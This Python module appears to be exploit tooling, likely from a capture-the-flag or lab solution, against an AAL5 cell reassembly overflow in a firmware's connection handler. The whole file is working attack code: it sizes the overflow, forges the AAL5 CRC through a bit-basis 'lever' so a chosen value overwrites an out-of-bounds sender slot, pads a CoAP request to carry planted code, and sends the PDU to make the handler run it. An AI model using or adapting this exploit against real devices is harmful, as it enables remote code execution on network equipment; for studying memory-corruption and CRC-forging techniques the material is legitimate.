"""Tooling for hitting the AAL5 reassembly overflow.
The actual shellcode crafting is in `shellcode.py`.
"""

from __future__ import annotations

import dataclasses
import struct

from patmy import CoapClient, Datagram, Frame, Pdu, UdpSession, aal5, coap, inet, pppoeoa
from patmy.crc import aal5_crc

BUFFER_SIZE = 472  # uint8_t frame[ATM_SDU_SIZE * 10 - 8] (userspace.c, struct connection)
REQUEST_SIZE = BUFFER_SIZE - pppoeoa.HEADER_SIZE - inet.HEADER_SIZE  # CoAP request size for that
DECLARED_SDU_SIZE = BUFFER_SIZE + aal5.Trailer.SIZE  # Plus the overflow trailer size

CRC_LEVER = slice(BUFFER_SIZE - 4, BUFFER_SIZE)
SENDER_OOB_INDEX = 2  # connection::senders[2] -> connection::request_body


class ReassemblyError(ValueError):
    """The handler did not overflow the way it is supposed to."""


def steer_crc(sdu: bytes, lever: slice, trailer_head: bytes, crc: int) -> bytes:
    """Picks the four bytes at `lever` so the PDU's own CRC comes out as `crc`."""

    def crc_with(lever_bits: int) -> int:
        patched = bytearray(sdu)
        patched[lever] = lever_bits.to_bytes(4, "big")
        return aal5_crc(bytes(patched) + trailer_head)

    base = crc_with(0)
    basis: dict[int, tuple[int, int]] = {}
    for bit in range(32):
        value, lever_bits = crc_with(1 << bit) ^ base, 1 << bit
        while value:
            leading = value.bit_length() - 1
            if leading not in basis:
                basis[leading] = (value, lever_bits)
                break
            other_value, other_bits = basis[leading]
            value, lever_bits = value ^ other_value, lever_bits ^ other_bits

    lever_bits, value = 0, base ^ crc
    while value:
        leading = value.bit_length() - 1
        if leading not in basis:
            # This should be unreachable
            raise ReassemblyError(f"No CRC lever for {crc:#010x}")
        other_value, other_bits = basis[leading]
        value, lever_bits = value ^ other_value, lever_bits ^ other_bits

    patched = bytearray(sdu)
    patched[lever] = lever_bits.to_bytes(4, "big")
    return bytes(patched)


def bare_size(request: coap.Message) -> int:
    """Measures the request without its payload, plus the payload marker."""
    return len(dataclasses.replace(request, payload=b"").to_bytes()) + 1


def payload_offset(request: coap.Message) -> int:
    """Finds where a planted request's payload lands in the buffer, i.e. `request_body`."""
    return BUFFER_SIZE - REQUEST_SIZE + bare_size(request)


def plant(request: coap.Message, block: bytes) -> coap.Message:
    """Pads a request out to fill the buffer, with `block` at the start of its payload."""
    room = REQUEST_SIZE - bare_size(request)
    if room < CRC_LEVER.stop - CRC_LEVER.start:
        raise ReassemblyError(f"CoAP request leaves no room for padding ({room} bytes)")
    if len(block) > CRC_LEVER.start - (BUFFER_SIZE - room):
        raise ReassemblyError(f"A {len(block)} byte payload would run into the CRC lever")
    payload = bytearray(room)
    payload[: len(block)] = block
    return dataclasses.replace(request, payload=bytes(payload))


def overflowing_pdu(session: UdpSession, request: coap.Message, *, sender: int = SENDER_OOB_INDEX, uu: int = 0) -> Pdu:
    """Builds one PDU that triggers the overflow."""
    payload = request.to_bytes()
    if len(payload) != REQUEST_SIZE:
        raise ReassemblyError(f"Request is {len(payload)} bytes, expected {REQUEST_SIZE} (use plant)")

    datagram = Datagram(payload, session.local_ip, session.peer_ip, session.local_port, session.peer_port)
    sdu = Frame(datagram.to_bytes(), session.local_mac, session.peer_mac, session.session_id).to_bytes()
    if len(sdu) != BUFFER_SIZE:
        raise ReassemblyError(f"Overflowing SDU is {len(sdu)} bytes, expected {BUFFER_SIZE}")

    # The reassembler checks the CRC before it copies the cell, so the CRC landing in
    # `sender` has to be the one the PDU really has.
    crc = int.from_bytes(sender.to_bytes(4, "little"), "big")  # the firmware reads the word little-endian
    trailer_head = struct.pack("!BBH", uu, 0, DECLARED_SDU_SIZE)
    return Pdu.from_sdu(steer_crc(sdu, CRC_LEVER, trailer_head, crc), uu=uu, length=DECLARED_SDU_SIZE)


async def execute(client: CoapClient, request: coap.Message, timeout: float = 5.0) -> bytes | None:
    """Makes the handler run the code planted in `request`, and reads the datagram back."""
    session = client.session
    await session.circuit.send_pdu(overflowing_pdu(session, request))
    try:
        return (await session.recv_datagram(timeout)).payload
    except TimeoutError:
        return None
